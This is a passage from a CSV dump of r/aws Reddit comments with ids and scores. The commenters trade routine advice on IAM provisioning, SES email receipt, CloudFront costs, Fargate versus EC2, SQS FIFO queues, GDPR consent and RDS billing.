if saml's a deal breaker, consider hashicorp vault to vend temp creds to on-prm developers.",2.0
g83g6bd,j6sgw9,"They just recently added APIs for AWS SSO.

https://aws.amazon.com/about-aws/whats-new/2020/09/aws-single-sign-on-adds-account-assignment-apis-and-aws-cloudformation-support-to-automate-multi-account-access-management/",2.0
g83su9v,j6sgw9,Nice! That’s the danger about commenting on an AWS service you didn’t use yesterday.,1.0
g81nehw,j6sgw9,"* Provisioning is automatic. 
* IAM restrictions so we’re not able to mess with org resources, restrictions 
* „full“ admin to accountable person (to the extent limited by the above)
* we’re working on barriers (forgot the term, the IAM thing that makes sure you can’t do X despite some policies allowing it)",1.0
g81qwjq,j6sgw9,It’s David...,1.0
g82e16q,j6sgw9,"\- Provisioning: We have a java webapp we wrote that provisions the accounts, creates terraform repos for the terraform modules, and auto-gens/commits templated terraform code that is common to all accounts.  
\- IAM: Some is done by the provisioning step.  The rest is managed in terraform at the account level and code reviewed by pull request approved by myself and a couple or three other folks.    AD groups... We still need to automate this but currently me or another person files tickets to get the relevant AD groups created that map to the roles.  
\- I personally set this.  
\- AD group membership is managed by me most of the time.  Nothing goes into nonprod or prod accounts except through automation pipelines that require human approval before code is merged.  
\- This is done 100% via pull requests against account level terraform modules.  
\- Most of this is done via terraform automation too.  I wrote a generic Config terraform module which is included in every account-level terraform module generated in the first bullet point above.",1.0
g81arzb,j6wvv8,"Configure your MX record to point to SES

Configure SES with your registered domain name.

SES can then receive email for your domain. You tell it what to do with the email, such as deliver email to S3: [https://aws.amazon.com/premiumsupport/knowledge-center/ses-receive-inbound-emails/](https://aws.amazon.com/premiumsupport/knowledge-center/ses-receive-inbound-emails/)

Use an S3 event message to trigger Lamda to do something with it, such as respond with SNS.

Use S3 life cycle to manage the deletion of email over time

I recommend also enabling S3 encryption with KMS to limit who can read the messages.

&amp;#x200B;

No need for Workmail. Workmail is for user email and requires at a minimum a simple directory service. I've calculated the cost of this for a client and would be around $50 a month for minimal users between the directory service and Workmail.",1.0
g81c8ka,j6wvv8,"I'm using a WorkMail domain because I don't have access to my organization's DNS configuration, which is required in order to set up an MX record.",1.0
g81cz29,j6wvv8,"unless you setup an MX record, SES will never receive an email.",1.0
g81g3lo,j6wvv8,"I guess SES set up an MX record for me then, for the AWS WorkMail domain I created. Example: foo.awsapps.com",1.0
g81m67b,j6wvv8,"SES doesn't do that unless the domain is configured as authoritative in route 53.

If that's the case, then you also have those permissions.",1.0
g81qrtc,j6wvv8,The domain isn't configured in Route 53. The domain is {WorkMail organization name}.awsapps.com. It's what AWS creates for you after you create a WorkMail organization.,1.0
g81d7zc,j6wvv8,"If you can't point your domain at ses, how are you going to point it at workmail?

And I think you'd need a user to be receiving the mail. Eg fred@yourdomain. If fred doesnt exist workmail would reject the message.",1.0
g81gm7g,j6wvv8,"I'm using a domain I created through WorkMail e.g. foo.awsapps.com

The question is, is there anything wrong with this approach? Because it's working in testing. If I email foo@foo.awsapps.com and I have an SES rule for foo@foo.awsapps.com , it runs the rule even though there is no foo@foo.awsapps.com inbox.",1.0
g81egie,j6wvv8,"I think you're getting confused about what a ""domain"" is. If you create an mx record for foo.com you've created a domain.

If you're trying to do something without ""corporate"" helping out and do some sort of autoforward to a different mail service : first they will likely come down on you like a ton of shit when they figure it out. They have rules and process and stuff and You're just bypassing it all without any oversight or approval. The first time it goes wrong there will be shouting.

Secondly, just buy a new domain with route53. Pick 10 random characters and the cheapest ending. Then make an mx record. Forward your mail to anything@randomchars.com. It'll cost like $9/year to register not $4/month + everything else it likely needs for workmail.

But still, talk to corporate about it or they will be annoyed.",1.0
g81rjii,j6wvv8,"I appreciate the clarification. When I created the organization in WorkMail, it automatically created the domain {WorkMail organization name}.awsapps.com

That's the domain I'm referring to. You're saying that using that is a bad approach?

Management is aware of the effort. It's not an attempt to auto-forward an email that's sent to foo@company.com on to foo@foo.awsapps.com. It's using foo@foo.awsapps.com as the first/final email destination.",1.0
g811hzm,j6vfuy,"I think it is better to use separate queue because:

1. FIFO queues have throughput limit that you might reach eventually.
2. You will have better visibility if certain event is being processed slowly from the SQS metrics.
3. Related to 2, you can autoscale each consumer independently based on SQS traffic.",2.0
g817s07,j6vfie,"Lots of missing features, appropriate username btw ;)",2.0
g82uqzr,j6vfie,😂,1.0
g82pgb7,j6vfie,"ES sued AWS and AWS can only use the actual open-source features in its service, which are hugely smaller in the latest version.

Hence the reason why people started switching to their own deployed version in an EC2.",2.0
g80uzvw,j6ux85,"For a static site, I'm not sure if anyone outside of the largest botnets could actually deny service from cloudfront. 

Now if someone was just trying to drive up your spend, 1T of traffic out of cloudfront would be $85, and its likely they would get blocked before getting anywhere near that",8.0
g80zugi,j6ux85,Why would anyone DDOS your CV?,3.0
g82b592,j6ux85,"There are no good solutions for this.
Best you can do is pray that nobody attacks your site, set cost alarms and be ready to shut it down, and hope AWS waives whatever cost occurs if it does happen (too quick for the cost alarm to pick it up).",1.0
g8335bw,j6ux85,"Activate the new [Cost Anomaly Detection](https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/getting-started-ad.html) for CloudFront on your account. Then create individual alerts to a [SNS topic](https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/ad-SNS.html) which allows you to create remediation actions like disabling the CloudFront distribution. 

&gt; A disabled distribution is no longer functional and does not accrue charges. You can enable a disabled distribution at any time.",1.0
g82ou1f,j6ux85,"Generally, I would not suggest hosting a static site on S3/CloudFront unless you're prepared to absorb those costs (or can pay for Shield Advanced). S3/CF has some weird behavior with routing, its limiting, and its very pay-as-you-go (where ""you"" in that means ""your users and whatever they decide they want to do"").

Better static site options:

- Netlify
- Surge
- There's a way to set up static site hosting on CloudFlare with Workers, to my understanding. If you're using it already for CDN or domains and want an option on something you already have that has a more fair pricing structure.

Those are the big ones.",-1.0
g81412l,j6uhbq,"Is the domain federated to AWS or are you using it with AWS SSO or some other SAML auth provider federated against your account? An SSO invocation to assume an IAM role allowed to drop files into just that S3 bucket may work - you'd still get credentials but they'd be issued from STS and would only live for a short time before being rotated out

Service accounts operating outside of AWS are interesting. I'm interested in the current state of best practices for this. Right now I see a lot of local IAM credentials created for this use case and folk often  just lock the heck out of the IAM permissions by adding all sorts of conditionals (remote IP address, user agent, allow only 1-region, etc.) to the policy and then maybe they turn on extra monitoring or a cloudtrails triggered alarm if the access key ID pops up in use anywhere else.  AWS SSO has been changing and improving so fast though as you can tell by all the social media ""have you deleted all your IAM users yet?"" type of posts. Interesting times in AWS permission land ...",1.0
g8178rq,j6uhbq,"Federated domain.

We can't use IAM roles since the files are not being copied from an EC2 instance.

I wanted to see if there was some way to not have the AWS credentials saved in in plain text, but still be able to schedule a recurring copy job from a local server to AWS S3 bucket.",1.0
g81anxf,j6uhbq,"I may be mis understanding your setup but for sure you can use IAM Roles from outside of EC2 -- if you can authenticate to AWS then you can assume an IAM role that has the locked down S3 permissions needed. The thing I was getting at is that if you can authenticate via a federated mechanism than the access keys you get are temporary, issued by AWS STS and are rotated out pretty fast -- end result is if the  keys leak or are stolen they are only usable for a short time.  So it's not exactly what you want but it gets you credentials that are way shorter lived than what you'd get with local IAM user keys. 

What you can't use outside of EC2 are EC2 IAM Instance Roles -- super convenient when inside AWS but yeah not an option here.",1.0
g81b2qw,j6uhbq,"I don't understand this.

How can you automate assuming an IAM role from outside of AWS when using a batch file script without then needing some other credential (for assuming the IAM role) saved on the local system?",1.0
g81f1nw,j6uhbq,"Yeah I may be brain dead today; sorry, was thinking that there was a good route with a domain joined machine to do this but all the stuff I've seen for real was with wonky ADFS implementations or people who wrote custom auth handlers via cognito or even lambda functions.",1.0
g81fk2z,j6uhbq,"If there is an unrelated EC2 instance joined to the same AD domain as the local server, would it make sense to either copy the files locally to the EC2 instance and then have a second copy job from the EC2 instance (with the relevant IAM role) to the S3 bucket or else have the EC2 instance copy the file directly from the on premises server file share to the S3 bucket?",1.0
g81jecn,j6uhbq,"I think what you need is AWS DataSync ( [https://aws.amazon.com/datasync/?whats-new-cards.sort-by=item.additionalFields.postDateTime&amp;whats-new-cards.sort-order=desc](https://aws.amazon.com/datasync/?whats-new-cards.sort-by=item.additionalFields.postDateTime&amp;whats-new-cards.sort-order=desc) )  


Alternatively you could use AWS Systems Manager hybrid activations to manage the VM using AWS (assuming you've got network access to the instance via VPN/DX) and then have SSM generate access keys with a short lifetime and copy those to the instance on a schedule",1.0
g80ux1w,j6ty4x,"Thanks for the write up. We are currently looking into unit/integration testing on our lambda application builds, this will be very handy.",1.0
g822j10,j6ty4x,Glad it helps!,1.0
g80wsua,j6tvj9,"You can't use functions in Parameter declarations.

https://aws.amazon.com/premiumsupport/knowledge-center/cloudformation-template-validation/

""3.    In your AWS CloudFormation template, confirm that the Parameters section doesn't contain any intrinsic functions.""


https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/intrinsic-function-reference.html

""You can use intrinsic functions only in specific parts of a template. Currently, you can use intrinsic functions in resource properties, outputs, metadata attributes, and update policy attributes. You can also use intrinsic functions to conditionally create stack resources.""",2.0
g82q1dy,j6tvj9,"You can ""properly"" define your export names ans use ""fn::sub"" to select them.

Eg:


```

Fn::ImportValue:
  Fn::Sub: ""${ImportedStack}-MyPublicSubnets""

```",1.0
g80jpk9,j6rjfl,"Fargate is containers running on AWS owned EC2s, there are some limitations to the configurations of the containers.


ECS on EC2 is running docker containers on any EC2 that you own, you can even `docker exec` into them if you want to.  ECS just picks the EC2 to run your container.  

&gt; why wouldn't I always choose EC2?

Because then you'll have to manage the EC2, like keeping it patched and so on.",5.0
g80ohz4,j6rjfl,"\&gt; why wouldn't I always choose EC2?

You may not be interested in managing a host and just want to focus on the content of your container.

15 minutes is a long shutdown time. You might consider how to checkpoint your state into something like Dynamo instead.",3.0
g80nd3z,j6rjfl,"It's similar ECS tasks - with EC2 you provide the container instance and the ECS tasks will run on it, so if you have multiple tasks you have to think not only about CPU/memory required by a task but also whether you have enough EC2 resources to run them. But you can use spot pricing or saving plans to get your EC2 instances so it will likely be cheaper if you're running all the time. 

With Fargate you don't have to worry about providing compute power but you're paying extra for it.",2.0
g83yub9,j6rjfl,Have you looked at Step Functions?,1.0
g8987wv,j6rjfl,"Step functions are the most expensive mistake I’ve seen in an aws setup. What could have been solved in a single lambda was modeled into a flow of 10 step functions, costing 80€ per day.",1.0
g898qhl,j6rjfl,Sounds like they picked the wrong tool for the job,1.0
g8bpy3g,j6rjfl,Indeed. They didn’t even do it themselves but really bad consultants which costed the company a multitude more than their pretty high rates by now.,1.0
g80p1a9,j6tlnf,I have a quarter that's a complete dollar by the same logic.,28.0
g80yhx6,j6tlnf,Can you elaborate?,1.0
g812aih,j6tlnf,"I think u/mcstafford means there's a contradiction in the title: ""complete"" and then ""part 1"". But then nothing is complete because books are comprised of chapters and pages instead of one long sheet with no table of contents...",13.0
g815kcj,j6tlnf,The other two parts of the three-part series are linked in the introductory paragraph.,1.0
g82vd6f,j6tlnf,"This is very far from ""complete""",4.0
g81s3ky,j6tlnf,"Great post, thank you.",2.0
g80pgor,j6tlnf,This is great thanks! Do you have more beginner stuff for AWS?,1.0
g8336iz,j6tlnf,"https://www.aws.training/ is what you need,  official AWS training stuff",2.0
g81lniz,j6tlnf,AWS does. They have videos and stuff that will teach you anything you'd like to know. Straight from aws,2.0
g8439jx,j6tlnf,"I have recently been doing a number of things using the Lambda, NodeJS, APIGateway, DynamoDB stack and I'm in love.",1.0
g80karh,j6qpb0,Generally every service has an IAM reference doc that includes a list of supported conditional keys in addition to the list of actions that service has. SCPs and the org ID keys are fairly new so might not be widely supported.,2.0
g809vn3,j6qpb0,Would also love to know if this is documented somewhere; seems like there could be some nasty gotchas in this,1.0
g81mark,j6rp8q,"Not sure what you mean by ""own implementation of retries"" since it's not clear what docs you've already read/what you've already tried. But I just took a look at the docs:

http://sdk.amazonaws.com/cpp/api/LATEST/class_aws_1_1_s3_1_1_s3_client.html#a32d8ed84950e71c2c3f3bf1e823fd16e

Since only the clients in the C++ SDK support custom clientconfig and retry strategies why not make 2 s3 clients with different retry strategies. Use one for reads and another for writes?

Some SDKs (at least the Java one) support passing a custom client config to the individual request objects, but that doesn't seem to be the case in the C++ SDK :(",1.0
g81e0me,j6roiq,Neat exercise but seems totally pointless if you use IaC.,5.0
g80ky1t,j6roiq,"If that's your post, you may want to use git+https instead of git+ssh to pip install so as to not require github credentials be available / your ssh key associated with a GH account.",2.0
g80aofv,j6rgpi,"Port forwarding is normally only needed when your home PC or your EC2 is sitting behind NAT.

For ec2 if your gaming instance has a public elastic IP no port forwarding should be needed on that end. On your home pc... if your sitting in a private address space like 192.168.x.x then you would need to forward ports on your home router... or less secure most routers have an option to put your Pc in the DMZ so it’s directly connectable I a the Internet.",1.0
g80f8bz,j6rgpi,"The host pc is the one that needs to have the ports forwarded, and in my case the host pc is the EC2 instance",1.0
g88t8dq,j6rgpi,"The EC2 instance is not behind NAT, No port forwarding is required.",1.0
g80dde7,j6rgpi,"Does the instance have a public IP? Then I think you just need to open ports in the security group settings. You just need to be careful. I would only open it towards your home IP.

What is your experience with remote desktop gaming so far? Does it reach the promised 4K 120 FPS?",1.0
g80f5da,j6rgpi,"So I just have to add the ports required by moonlight in the security group rules? Would that be inbound or outbound rules?

&amp;#x200B;

Regarding your last statement, it allegedly can go up to 4k but I never tried it and 108p or even 720p at 60fps is sufficient for me as I would prefer to minimize input delay.",1.0
g80g8pc,j6rgpi,"&gt; So I just have to add the ports required by moonlight in the security group rules? Would that be inbound or outbound rules?

If you connect from your machine to EC2, that connection is inbound from the perspective of EC2.

Usually outbound all ports are open - isn't that also the default? I don't have it in front of me right now.

Just to say again, if you open an inbound port to the whole world, this is dangerous. AWS recommends against opening any ports (unless you offer a service to the public).",1.0
g822ck3,j6rdhw,"The [VPCZoneIdentifier property](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-as-group.html#cfn-as-group-vpczoneidentifier) expects a value of type ""List of String"". So you need to make sure the parameter you are referencing is of that type. Or, if it's a single value of type String you could do:

    ""VPCZoneIdentifier"": {
        [
            ""Ref"": ""InstanceSubnets""
        ]
    }",1.0
g80ur79,j6qso5,"The very first example in the docs shows an event pattern to filter to running instances only.

https://docs.aws.amazon.com/AmazonCloudWatch/latest/events/CloudWatchEventsandEventPatterns.html

Are there other resources types you monitor with the same rule?",1.0
g82m1pf,j6qso5,"hi, thanks for your reply!

we are planning to use this one specifically: [https://docs.aws.amazon.com/health/latest/ug/cloudwatch-events-health.html#all-ec2-events-rule](https://docs.aws.amazon.com/health/latest/ug/cloudwatch-events-health.html#all-ec2-events-rule)

for there, the only example is for  **Example : Rule for all Amazon EC2 events.** We don't see an example or a way to filter the resource on to exclude the stopped instances.",1.0
g80da6l,j6pf36,Make sure your routing is configured properly on the VPC side as well as security groups of instances you're trying to ping (they may not allow ping inbound).,1.0
g80ell8,j6pf36,"No, i'm talking about ping between inside ip addresses which used on both sides of gre tunnel. Here is an example:
&gt; Inside IP Addresses
&gt;
&gt;  - Customer Gateway         		: 169.254.178.126/30
&gt;
&gt;  - Virtual Private Gateway             : 169.254.178.125/30


Neither routing nor security groups could affect icmp between these addresses :(",1.0
g7zwkx2,j6q06v,"I suspect you've used constructs that are not flagged as 'stable' and are not subject to semver (according to how the CDK repos work), so you're now pulling in 6 months of potentially non-backwards compatible changes.

I think you have two choices:

1) Basically as you say, accept the new versions and test the upgrade process, or

2) Specify the exact module versions in this repo and continue using the old version of CDK.",3.0
g80xqcs,j6q06v,"I'd do both in a new acct, specify versions to stand up &amp; verify, then remove versions to upgrade &amp; test from there.",1.0
g7zztr3,j6mmxn,"S3 is the service for basic object storage, trying to shoehorn images into dynamo wouldn't be a great idea.",2.0
g80drkk,j6mmxn,It’s just the s3 is really expensive. Are there any other alternatives for storing images?,1.0
g80eoy5,j6mmxn,"S3 is much cheaper than dynamo, if you are writing and reading to dynamo you can drive your costs up. S3 is the cheapest storage option you are probably going to find. Maybe you can try other cloud storage services, linode has 250GB of s3 storage for $5/mo.",2.0
g80qnfi,j6mmxn,"I think my concern here would be the puts, copies, and list requests. Does the AWS-cli s3 cp command with the recursive flag add a put request per file?",1.0
g80r0xs,j6mmxn,"I dont know for sure, but there is an s3 cost calculator you can use to see what your costs are, but like I said, if you are imagining that all your s3 puts are going to be enough to drive a high cost, dynamo cost will be even higher.",1.0
g80b3qm,j6orzo,"It's possible with lambda.

the output (s3 file) can't be more than 1Mb. 

I wrote [this script](https://gist.github.com/Burekasim/46aa5bc696160c4d33013ab1d0ae9784), that will hopefully evolve into a blog post one day. it works perfectly.",2.0
g8392i9,j6orzo,"That's certainly a cool script! Thanks for sharing. But doesn't that incur Lambda costs in addition to S3 requests? I still think proxying to an S3 site should be a thing.

Of course with everything it all depends on your use case. In certain situations this could be exactly what you need.

But again I like this, you should definitely write that post! Also it would be interesting if you would include what sort of difficulties you ran into and how you solved them.",1.0
g83su2t,j6orzo,"The lambda cost per a million requests is around 1.5$. 

There are 2 limitations with this script: 
1. object size must be less than 1Mb. 
2. in peak, lambda is throttled [1] at 3K requests/sec.

The idea behind this script was to allow the same features that GCP global load balancer provides. it works pretty well.





[1] https://docs.aws.amazon.com/lambda/latest/dg/invocation-scaling.html",1.0
g7zs0b1,j6orzo,"You should be able to do this already with ALB. Create two rules in your ALB, one that redirects to your S3 site, and one that points you to your ECS. Then point your domain to ALB. Should work for you, or I am not understanding what you are trying to achieve exactly",1.0
g7zsij2,j6orzo,"I thought of that but a few things about that approach are undesirable to me:

1. I can't use this and also have it all on one domain, because the S3 site would be on a different domain;
2. It would send visitors to my S3 site directly so I can't have TLS that way, because S3 bucket sites don't support TLS.

To fix the TLS cheaply serverlessly I would need to put Cloudfront in front of my S3, so then I am back to my original situation, except with two domains where I would like it to be one domain.

Does that make sense?",1.0
g802v84,j6orzo,"In that case, I' suggest creating an ECS Fargate Container running nginx. Setup nginx to redirect to your S3 bucket without changing the URL ([take a look at this](http://nginx.org/en/docs/http/ngx_http_rewrite_module.html#rewrite)). Now, instead of pointing to your S3 bucket, point the ALB listener to this ECS. Effectively, your clients will see only one domain, but you would still have the S3 domain under the hood. Anyway, why don't you use CloudFront? It will save you data transfer charges by a lot",2.0
g803e6e,j6orzo,"That's not a bad idea - downside of that would be having another Docker image to maintain. But in these days of CI/CD that's not such a big deal.

I'm under the impression that CloudFront doesn't really save on data transfer charges right? From what I understand you pay for CloudFront's traffic to the visitor. Traffic from CF to/from S3 is free but instead of the traffic coming from S3 it's just coming from CF now.

Or am I misunderstanding you? This particular part is not my forte TBH.

To be clear, I'm going for CloudFront now because that seems the best option all in all. Still I hope someone at AWS will pick this up. Not holding my breath though. :) I assume there's a good reason this isn't a thing yet.",1.0
g7zt2gs,j6orzo,This might help you: https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html#redirect-actions,1.0
g7zu4l6,j6orzo,"I have two replies to my post so far and both of them suggested this - am I missing something obvious? I don't understand how that allows me to have everything on one domain. Isn't this the exact opposite of that?

Edit: [my other comment](https://www.reddit.com/r/aws/comments/j6orzo/feature_request_target_s3_static_site_with_an_alb/g7zsij2?utm_source=share&amp;utm_medium=web2x&amp;context=3) describes more clearly what I mean.",1.0
g834exg,j6orzo,"It's mainly because S3 doesn't live inside of a VPC and you need to use a VPC-Endpoint to route traffic to your bucket.

ALB on the other hand routes traffic into a VPC.

An overly complex architecture for what you are describing can be found here:
https://d0.awsstatic.com/aws-answers/Accessing_VPC_Endpoints_from_Remote_Networks.pdf

I am sure though that you can simplify this a bit for your use case.",1.0
g7zojk8,j6mgre,"Not a lawyer, but did a lot of GDPR wrangling early on.

If they provide you with their email address in order to obtain a service from you (using the website) then they have consented to you having that information for the purpose of providing that service. You can send them password reset emails if needed, but you don't have their consent to send them a newsletter or a ""hey you haven't logged on in a while, come back"" email. If you have a process where old accounts are removed after a period of time, you can send them a reasonable number of emails warning them of that.

What you need to be careful of is where you use that email address once you have it, because if you time out their account or they ask you to close their account, you must be able to remove all of their identifying data.",2.0
g7zop0u,j6mgre,"So, I may just ask them to accept terms and conditions of the services where I use their emails in wider range of usages later on in the flow etc., e.g. add info to token so I know they have accepted terms and conditions so they can access services if and only when they gave full consent and I am good to go?",1.0
g8078tl,j6mgre,"That should be sufficient to prove good faith, yes. The problem ultimately is that GDPR doesn't have any significant supporting case law yet, so you're left trying to behave correctly amidst a whole raft of uncertainties!",2.0
g808lqw,j6mgre,"Not a lawyer, but check out what a ""transactional"" relationship is under GDPR. Presumably your users are coming to you for a service, so the GDPR rules are slightly easier to manage.",1.0
g833jov,j6mgre,Do that after sign up. Show a GDPR consent screen over accessing your app and they can only access the app after they accepted it.,1.0
g836rkc,j6mgre,"So it is ok I have their email, because they've signed up?",1.0
g7zkr09,j6nyxe,"As I understand it from the documentation, a FIFO queue guarantees the order in which messages are retrieved will be the same order they were queued, and nothing else.

If your application retrieves only one message from the queue and, in a failure state, waits until the visibility period has elapsed before polling the queue again, that would give you the blocking behaviour you describe - but the onus for that is on the application, not SQS.",2.0
g7znmxb,j6nyxe,"This has been pretty helpful but it left me with some further questions which I have researched.

I will write up my findings for future viewers of this post.",2.0
g7znw11,j6nyxe,"After doing some further reading, I have found that using group IDs is very important when using fifo queue type.

The messages within the same group ID are worked in serial on a first come first serve basis and are blocked till a message has been fully worked or moved to a DLQ.

Multiple group IDs can be work in parallel.

If you are only using a single group ID then everything will be worked in order and can block other messages from be processed.",2.0
g7zqd1l,j6m6w0,There are other costs for RDS besides the instance itself. Storage is one item that isn’t specific to the instance type but would show up in the final total.,3.0
g800498,j6m6w0,"I know, please note I filtered by  EU-InstanceUsage:db.m4.large so the rate is purely for run time.",0.0
g82u858,j6m6w0,"It's likely one of the additional cost items I've mentioned and others have as well - disk usage, backup usage, network transfer out of RDS, etc. However, your best bet is to reach out to AWS Support if you believe you're being billed incorrectly as they're the ones most equipped to clarify each line item on your bill.",1.0
g81b9x0,j6m6w0,"https://ec2instances.info/rds/?region=eu-west-1

The cost you are receiving is the listed cost for db.m4.large for eu-west-1 for the SQL Server engine.  Is that what you are running?  Not all engines have the same cost.",3.0
g7zlfrt,j6m6w0,"how can you even suspect that a company of the size of amazon will overcharge you? how come your first idea is not ""how did i screw it up""? i just can't wrap my head around it",5.0
g7zltsv,j6m6w0,... I think you forgot to put /s at the end there friend,2.0
g8016cq,j6m6w0,"There is no perfect company in the world, despite if you read my question carefully you'll see I am simply asking if this is normal.",-1.0
g807jk9,j6m6w0,"i'm sorry, but doesn't the title say ""aws cost inflated""? maybe that's just a bug, and it shows the wrong title to me",3.0
g8kyp08,j6m6w0,Yeah! I think reddit is definitely bugging out and not showing the question mark at the end of title for you.,1.0
g8l0drx,j6m6w0,did you figure out how to check the billing details in the meantime?,1.0
g80jvgp,j6m6w0,What database engine? Oracle and sqlserver are more expensive than mysql or postgres,2.0
g7zjhnq,j6m6w0,Maybe multi-AZ deployment?,1.0
g801ydd,j6m6w0,"Not running for this particular instance, and the figures I posted there are filtered, please see the image attached on the post.",1.0
g7zk643,j6m6w0,Definitely running in the expected region? Running multi-AZ?,1.0
g8000fx,j6m6w0,"I'm in South Africa running on EU(Ireland), and I am not using multi-AZ.  


The cost is filtered by  InstanceUsage:db.m4.large",1.0
g7zrc3g,j6m6w0,"As others have said, most likely multi-az deployment (so you have x3 db servers). Other cost factors (unsure if they come under rds in billing breakdown though) are: networking (including az -&gt; az transfers), disk size and type",1.0
g800xuz,j6m6w0,"Hey Please note I got this figure after applying filters on the billing reports, see the attached image.[https://ibb.co/wNx7zsC](https://ibb.co/wNx7zsC)  


I do not have  Multi-AZ deployment activated.",1.0
g800nok,j6m6w0,Please find image here showing reports &amp; filters : [https://ibb.co/wNx7zsC](https://ibb.co/wNx7zsC),1.0
g82rkuz,j6m6w0,Which DB engine is your RDS instance using?,1.0
g7zigi3,j6k8z9,"This is my go to template.

https://github.com/1Strategy/fargate-cloudformation-example/blob/master/fargate.yaml

From here you can make the changes to be EC2. Most of it should be the same.",1.0
g809own,j6k8z9,"Looks like a good one.

Seems like swapping from Fargate to EC2, and removing the Load Balancer to setup an automatically-associated EIP would be all that's required to be modified. Not sure about my Budget Alarm requirement.

If you have any extra queues, I'll take that in, but in any case thanks for that! The ""automatic EIP"" somehow seems to be an obscure task... I'm not sure why AWS made it so annoying to set up (there are no easy ways to automatically associate the EIP after an EC2 relaunch through ASG... see [my older question](https://www.reddit.com/r/aws/comments/i8ds97/how_could_asg_assign_eip/)).",1.0
g7zn6eo,j6k8z9,"Hi,

You can find a whole lot of IaC templates here.

[https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/sample-templates-appframeworks-eu-west-1.html](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/sample-templates-appframeworks-eu-west-1.html)",1.0
g809rmj,j6k8z9,I'm surprised by the lack of complete stacks presented there. But thanks anyways!,1.0
g82frv9,j6m06m,Super odd. Switching to node-fetch fixed it. It only happens during tests. running a script with either works fine.,2.0
g7zc1i7,j6m06m,"Your question is on signed requests for Elasticsearch?
See this blogpost:
https://blog.ruanbekker.com/blog/2018/08/20/using-iam-authentication-with-amazon-elasticsearch-service/",1.0
g81z2xs,j6m06m,"No, sorry, API Gateway. And unfortunately this is such a weird problem that it's probably fairly specific to whatever I'm doing. I thiiink it might be CORS related though. Still reeeally odd.",1.0
g7z68g5,j6k8te,"Everything except the first hit seems useful.

https://duckduckgo.com/?q=CloudFront+CDN+redirect",2.0
g7z7h7a,j6k8te,"This probably refers to an S3 static website with redirect configuration. This page in the docs https://docs.aws.amazon.com/AmazonS3/latest/dev/website-hosting-custom-domain-walkthrough.html . Bit confusing to say that CF redirects when it is actually the S3 bucket ""behind"" it that does the redirects.",1.0
g7ziby8,j6imbx,You should see if using api gateway and lambda can replace that ec2 instance.,3.0
g7zk9bc,j6imbx,"Thank you, for split second I thought ""ah yes, this is great advice, why didn't I use lambda instead""  


Then I remembered, the functions on EC2 may expand or may add many complicated features later in the future  


So using EC2 still okay right?",1.0
g7zkezz,j6imbx,"Two acronyms come to mind:

- KISS: keep it simple, stupid 
- YAGNI: you ain’t gonna need it

It seems that you are optimizing prematurely. It’s your money but, if I were doing this, I would opt for Lambdas to minimize costs and maintenance.",5.0
g82khzo,j6imbx,"Couldn't agree more

But one thing I forgot to mention, the server also required to be running Laravel, so I think I keep using the EC2",1.0
g7znobc,j6imbx,"Check the app and see if you can use lambdas or containers. If possible, deploy with SAM. It will make your life easier.",3.0
g80gwmm,j6imbx,"You could just use Netlify and save a lot of time and money, but it’s fine for learning purposes.",3.0
g82k3fc,j6imbx,"yup 80% for learning purpose actually, I'm trying to get used to using AWS",1.0
g7zrgq6,j6imbx,What about using Amplify?,1.0
g82k9r9,j6imbx,"Never used it before, but quick read, Isn't amplify way too overkill?

My requirement also need to use Laravel PHP as the server",1.0
g8l8amq,j6imbx,"If is not fully serverless, amplify doesn't meet your requirement!",1.0
g80o35h,j6imbx,If you’re doing this as a project to showcase I’d also suggest to add a CI/CD pipeline for continuous updates to your blog.,1.0
g82k1yi,j6imbx,"That's what I still thinking, what is the best way to set up the pipeline.  
My plan is:  
\- Made changes to Nuxt (static generator), push to bitbucket  
\- Setup Pipeline to build the static website  
\- Deploy the artifacts (result from building the static website) to S3 ---- but how?",1.0
g82osd0,j6imbx,You can use either CodeCommit or Github for your repository and then use CodeBuild to build your site and have CodeDeploy deploy the changes to your S3 bucket. If you check out the documentation for those products they have some tutorials to get you going. It shouldn’t take too long.,2.0
g82q4kc,j6imbx,"Okay, thanks for the tip

Will implement this tomorrow",1.0
g7yq73m,j6hhb4,"First thing is to define what is meant by ""performs well globally"". Moving processing closer to the user is often helpful, but exactly how helpful is it in your app? Will it make a noticeable difference?

Look at the actual network latency delta, and the number of round trips. Is the extra latency to cover a bit more network distance the big factor here, or is it the performance of the back-end processing? Could you get a bigger improvement by reducing the number of RTTs, than reducing the length of a single RTT? If yes, deploying to multiple regions isn't addressing the biggest delay.

Pushing static content out via CloudFront globally and centralising dynamic content processing/generation is a well-tried model that works surprisingly well for a global audience. A more complicated global architecture *might* help, but it's just as likely to make things worse through additional synchronisation points and unanticipated side effects.

Also, stating the obvious perhaps, but the user base may not be distributed evenly around the world. I'm sure you'll know where your users are, but something to think about.",5.0
g7zig6b,j6hhb4,"You can slap global accelerator in front of your load balancers to help the global aspect. It’ll use anycast DNS to route the user to a local AWS POP and then traverse their backbone to the source region where the stack lives. It’ll help a lot with the uncertain / non guaranteed nature of the internet, and it’s extremely easy to implement.",2.0
g7yojay,j6hhb4,"The easier option you suggested is likely the cheapest, and may be correct if that fits your performance requirements.

If that doesn't cut it, Aurora/DynamoDB/S3 all have replication features where you can have the data replicated around to different AWS regions, and it if you're using cloudformation/terraform it would be fairly trivial to build out your API Gateway and lambda out into other regions as well. This is definitely much more expensive, but may be simpler then doing something more clever.

How you break up the app for global scaleability is not an all or nothing question depending how crazy you want to get with global service load balancing. I'm not an expert at cloudflare, but other leading CDN products (akamai, for example) allow you to direct customers to an origin closer to their geo-location for better performance. so you could have certain content/operations handled locally, and others handled at the primary location in the US. You can do really magic things with a good CDN.",1.0
g7yf0k6,j6f58g,"For me, it was when I used AutoScaling for the first time. This was \~4-5 years back and our service was starting to grow and we could no longer vertically scale our instances so we decided to try out AutoScaling and everything just worked smoothly (mostly) and it made me realize that this was one of the benefits of using a cloud based service!

The other option would probably be anytime I use S3 - I'm always surprised by how versatile S3 is.",13.0
g7zaho1,j6f58g,Just for web servers right?,0.0
g7zazwb,j6f58g,Auto scaling is not just for web servers.,2.0
g7zdndx,j6f58g,Yeah i know. I'm just interested how it was implemented for non web servers.,2.0
g7ziq6k,j6f58g,I’ve implemented Autoscaling based on SQS queue length. Once for Windows/EC2 and a few times for a Fargate service.,5.0
